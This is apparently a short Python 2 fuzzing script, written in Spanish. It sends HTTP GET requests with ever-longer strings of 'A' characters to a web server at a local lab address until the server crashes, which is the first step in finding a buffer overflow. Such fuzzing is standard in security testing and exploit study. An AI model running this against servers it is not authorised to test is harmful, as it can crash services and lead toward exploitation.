import socket
metodo_http = "GET "
buff = ""
cabecera_http = " HTTP/1.1\r\n\r\n"
while True:
    buff = buff+"\x41"*100
    buff_final = metodo_http+buff+cabecera_http
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.1.56',80))
        print "Fuzzeando con %d bytes" % len(buff)
        sock.send(buff_final)
        sock.recv(33)
        sock.close()
    except:
        print "El servidor ha crasheado con %d bytes" % len(buff)
        exit()
